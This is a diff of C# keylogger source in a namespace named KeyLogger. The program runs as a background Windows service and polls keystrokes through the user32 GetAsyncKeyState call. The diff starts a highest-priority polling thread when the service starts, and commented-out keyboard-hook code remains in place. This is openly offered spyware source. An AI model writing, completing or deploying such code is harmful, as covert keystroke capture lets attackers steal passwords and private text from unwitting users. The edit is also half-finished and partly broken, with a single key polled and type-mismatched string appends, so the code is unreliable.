@@ -10,6 +10,7 @@ using System.Timers;
 using System.Runtime.InteropServices;
 using System.Windows.Input;
 using System.Runtime.CompilerServices;
+using System.Windows.Forms;
 
 namespace KeyLogger
 {
@@ -51,8 +52,8 @@ namespace KeyLogger
         [DllImport("kernel32.dll")]
         static extern IntPtr LoadLibrary(string lpFileName);
 
-        [DllImport("user32")]
-        public static extern bool GetAsyncKeyState(int vKey);
+        [DllImport("user32.dll")]
+        public static extern int GetAsyncKeyState(Keys vKey);
 
         private readonly Double _interval = (new TimeSpan(1, 0, 0, 0)).TotalMilliseconds;
         private System.Timers.Timer m_Timer;
@@ -63,35 +64,44 @@ namespace KeyLogger
         static void Main()
         {
             System.ServiceProcess.ServiceBase.Run(new Client());
+        }
 
+        static void KeyloggerThread()
+        {
             bool[] oldKeys = new bool[256];
             bool[] newKeys = new bool[256];
-
+            
             while (true)
             {
-                Thread.Sleep(1);
+                Thread.Sleep(100);
 
-                for (int i = 0; i < newKeys.Length; i++)
-                {
-                    newKeys[i] = GetAsyncKeyState(i);
-                }
+                pressedKeys += GetAsyncKeyState(Keys.A);
 
-                for (int i = 0; i < newKeys.Length; i++)
-                {
-                    if (newKeys[i] != oldKeys[i] && newKeys[i])
-                    {
-                        KeyDown(i);
-                    }
-                    else if (newKeys[i] != oldKeys[i] && !newKeys[i])
-                    {
-                        KeyUp(i);
-                    }
-                }
+                //if (GetAsyncKeyState(Keys.A) == -32767)
+                //{
+                //    KeyDown(0);
+                //}
+                //for (int i = 0; i < newKeys.Length; i++)
+                //{
+                //    newKeys[i] = GetAsyncKeyState(i);
+                //}
 
-                for (int i = 0; i < newKeys.Length; i++)
-                {
-                    oldKeys[i] = newKeys[i];
-                }
+                //for (int i = 0; i < newKeys.Length; i++)
+                //{
+                //    if (newKeys[i] != oldKeys[i] && newKeys[i])
+                //    {
+                //        KeyDown(i);
+                //    }
+                //    else if (newKeys[i] != oldKeys[i] && !newKeys[i])
+                //    {
+                //        KeyUp(i);
+                //    }
+                //}
+
+                //for (int i = 0; i < newKeys.Length; i++)
+                //{
+                //    oldKeys[i] = newKeys[i];
+                //}
             }
         }
 
@@ -145,6 +155,11 @@ namespace KeyLogger
         {
             m_Timer.Start();
 
+            Thread ThreadKeyloggerThread = new Thread(new ThreadStart(KeyloggerThread));
+            ThreadKeyloggerThread.SetApartmentState(ApartmentState.STA);
+            ThreadKeyloggerThread.Name = "static void KeyloggerThread()";
+            ThreadKeyloggerThread.Priority = ThreadPriority.Highest;
+            ThreadKeyloggerThread.Start();
             //IntPtr hInstance = LoadLibrary("User32");
             //hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyHookProc, hInstance, 0);
 
@@ -160,7 +175,7 @@ namespace KeyLogger
 
         static void KeyDown(int vKey)
         {
-            pressedKeys += " PressedKey";
+            pressedKeys = " PressedKey";
         }
 
         static void KeyUp(int vKey)
